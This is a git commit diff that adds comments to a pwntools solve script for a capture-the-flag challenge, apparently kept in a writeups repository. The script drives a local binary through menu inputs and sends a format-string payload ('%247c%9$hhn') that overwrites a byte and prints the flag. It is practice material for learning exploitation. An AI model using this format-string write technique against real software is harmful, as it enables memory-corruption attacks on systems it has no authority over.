6883ddcba9d8bf7c6a2e48ff9348e9dd63dac9e6
citadelhack <147342219+citadelhack@users.noreply.github.com>
2024-09-04 08:07:42 -0400

    Update solve.py

--- LocalWriteups/CyberSpace/byte-modification-service/solve.py
+++ LocalWriteups/CyberSpace/byte-modification-service/solve.py
@@ -2,16 +2,28 @@ from pwn import *
 
 p = process("./chall")
 
-sleep(1)
 
+# Main Payload
 fmt = b"%247c%9$hhn"
+
+#Filling the rest of the buffer
 fmt += b"A" * (19 - len(fmt))
+
+#Grabing the proper address from the stack
 print(p.recv())
 p.sendline(b"11")
+
+#Selecting the least significant byte to modify
 print(p.recv())
 p.sendline(b"0")
+
+#XORing that byte by the proper value
 print(p.recv())
 p.sendline(b"69")
+
+#Sending the payload
 print(p.recv())
 p.sendline(fmt)
+
+#Print the flag
 print(p.recv())
